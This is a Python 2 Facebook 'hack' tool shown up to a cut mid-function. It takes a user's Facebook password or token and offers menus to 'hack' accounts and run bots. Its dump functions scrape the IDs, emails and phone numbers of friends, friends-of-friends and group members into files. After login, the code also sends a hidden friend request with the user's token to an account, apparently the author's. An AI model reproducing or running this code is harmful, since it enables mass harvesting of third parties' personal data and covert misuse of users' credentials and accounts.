#!/usr/bin/python2
# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0')]

#-exit-#
def exit():
	os.system('clear')
	print "\033[1;91m[©] Join my facebook page..."
	os.system('sleep 3 && clear')
	os.system('xdg-open https://www.facebook.com/learntermux1linux1/')
	os.sys.exit()
        tool_main_function()

#-Animation-#
def mkdir(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)

##### LOGO #####
logo = """      
                                                                                                                                 \033[1;91m
  🦋 🦋  🦋    🦋    🦋  🦋    🦋   🦋   🦋    🦋 🦋  🦋 🦋  🦋  🦋 🦋 🦋  🦋 🦋\033[1;91m
 ─██████████████─████████──████████─██████████████─██████──────────██████─🦋      \033[1;91m
 ─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████████████▒▒██─ 🦋     \033[1;91m
 ─██▒▒██████▒▒██─████▒▒██──██▒▒████─██▒▒██████▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─   🦋   \033[1;91m
 ─██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██───██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─  🦋    \033[1;91m
 ─██▒▒██████▒▒██───████▒▒▒▒▒▒████───██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─🦋      \033[1;91m
 ─██▒▒▒▒▒▒▒▒▒▒██─────██▒▒▒▒▒▒██─────██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─   🦋   \033[1;91m
 ─██▒▒██████▒▒██───████▒▒▒▒▒▒████───██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─ 🦋     \033[1;91m
 ─██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██───██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─  🦋    \033[1;91m
 ─██▒▒██──██▒▒██─████▒▒██──██▒▒████─██▒▒██████▒▒██─██▒▒██──────────██▒▒██─   🦋   \033[1;91m
 ─██▒▒██──██▒▒██─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──────────██▒▒██─   🦋   \033[1;91m
 ─██████──██████─████████──████████─██████████████─██████──────────██████─ 🦋     \033[1;91m

\033[1;97m╔═══════════════════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mDevlop By: \033[1;91m: \033[1;96mDEVILAND       \033[1;97m                         ║
\033[1;97m║\033[1;93m* \033[1;97mNotice \033[1;91m : \033[1;96m   Only Use Token For Login   \033[1;97m             ║
\033[1;97m╚═══════════════════════════════════════════════════════╝"""


# load #
def load():
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[*] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


##### choices Login #####
def tool_main_function():
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m║"
	login_method = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if login_method =="":
		print"\033[1;91m[!] Wrong input"
		exit()
	elif login_method =="1":
		login()
	elif login_method =="2":
		fbtoken()
	elif login_method =="0":
		exit()
	else:
		print"\033[1;91m[!] Wrong input"
		exit()

##### LOGIN #####
#================#
def login():
	os.system('clear')
	try:
		fb_token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print('\033[1;91m[☆] \033[1;92mFACEBOOK LOGIN \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		load()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				pick = open("login.txt", 'w')
				pick.write(z['access_token'])
				pick.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				exit()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			exit()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			login()

##### TOKEN #####
def fbtoken():
	os.system('clear')
	print logo
	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		pick = open("login.txt", 'w')
		pick.write(fb_token)
		pick.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			exit()
		elif e =="y":
			login()
		else:
			exit()

##### MENU ##########################################
def menu():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		exit()
	os.system("reset")
	print logo
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
	print "\033[1;97m╚"+40*"═"
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m User information"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get Id/email/hp"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Hack facebook account               "
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot       "
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Others           "
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Show token           "
        print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Update           "
	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Delete trash          "
	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m LogOut            "
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit the programs          "
	print "║"
	choices()
#-
def choices():
	pick = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if pick =="":
		print "\033[1;91m[!] Wrong input"
		choices()
	elif pick =="1":
		information()
	elif pick =="2":
		dump()
	elif pick =="3":
		menu_hack()
	elif pick =="4":
		menu_bot()
	elif pick =="5":
		func()
	elif pick =="6":
		os.system('clear')
		print logo
		fb_token=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
        elif pick =="7":
                os.system('clear')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                menu()
	elif pick =="8":
		os.remove('out')
	elif pick =="9":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.facebook.com/learntermux1linux1/')
		exit()
	elif pick =="0":
		exit()
	else:
		print "\033[1;91m[!] Wrong input"
		choices()

##### INFO #####
def information():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	mkdir('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
	tryy = json.loads(r.text)
	for i in tryy['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			print 42*"\033[1;97m═"
			try:
				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

##### DUMP #####
def dump():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get group member ID"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member email"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member phone number"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get email friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get a friend's phone number"
	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_dump()
#-----choices
def choose_dump():
	choose_from = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if choose_from =="":
		print "\033[1;91m[!] Wrong input"
		choose_dump()
	elif choose_from =="1":
		friends_id()
	elif choose_from =="2":
		id_from_friends()
	elif choose_from =="3":
		id_member_group()
	elif choose_from =="4":
		em_member_group()
	elif choose_from =="5":
		no_member_group()
	elif choose_from =="6":
		email()
	elif choose_from =="7":
		email_from_friends()
	elif choose_from =="8":
		phone_number()
	elif choose_from =="9":
		phone_number_from_friends()
	elif choose_from =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		choose_dump()

##### ID friends #####
def friends_id():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
		z=json.loads(r.text)
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/friends_id.txt','w')
		for a in z['data']:
			idfriends.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/friends_id.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### ID FROM FRIENDS #####
def id_from_friends():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)
		z=json.loads(r.text)
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/friends_id_from_friends.txt','w')
		for a in z['friends']['data']:
			idfromfriends.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/friends_id_from_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### ID FROM GROUP MEMBER #####
def id_member_group():
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		mkdir('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/member_group.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for a in s['data']:
			member_id.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(member_id))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(member_id))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/member_group.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### EMAIL FROM group #####
def em_member_group():
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		mkdir('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/em_member_group.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			try:
				emmem.append(z['email'])
				make_action.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_member_group.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### PHONE NUMBER FROM GROUP #####
def no_member_group():
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		mkdir('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/no_member_group.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			try:
				number.append(z['mobile_phone'])
				make_action.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(number))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(number))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_member_group.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### EMAIL #####
def email():
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
		a = json.loads(r.text)
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/email_friends.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			try:
				em.append(z['email'])
				make_action.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/email_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### EMAIL FROM FRIENDS #####
def email_from_friends():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
		a = json.loads(r.text)
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/em_friends_from_friends.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			try:
				email_from_friends.append(z['email'])
				make_action.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(email_from_friends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(email_from_friends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
